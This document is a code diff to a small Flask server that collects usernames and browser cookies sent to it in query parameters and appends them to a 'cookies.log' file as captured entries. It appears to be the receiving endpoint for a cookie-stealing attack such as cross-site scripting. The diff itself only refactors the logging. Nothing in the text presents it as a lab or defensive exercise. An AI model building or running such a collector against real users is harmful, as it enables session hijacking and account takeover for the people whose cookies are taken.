@@ -2,22 +2,24 @@ from datetime import datetime
 from flask import Flask, request
 app = Flask(__name__)
 
-def log(username, cookie):
-    log_file = open("cookies.log", "a")
-    log_file.write("%s %s\n" % (username, cookie))
-    log_file.close()
+log_name = "cookies.log"
+
+def log(text):
+    f = open(log_name, "a")
+    f.write(text)
+    f.close()
 
 @app.route('/', methods=['GET'])
 def root():
     username = request.args.get('username')
     cookie = request.args.get('cookie')
     if username and cookie:
-        log(username, cookie)
+        log("Captured username=%s cookie=%s\n" % (username, cookie))
         response = "Received username=%s cookie=%s" % (username, cookie)
     else:
         response = "Did not receieve username and cookie params"
     return response
 
 if __name__ == '__main__':
-    log("New Session Started:", datetime.now())
+    log("New Session Started: %s\n" % datetime.now())
     app.run(host='0.0.0.0', port=8080)
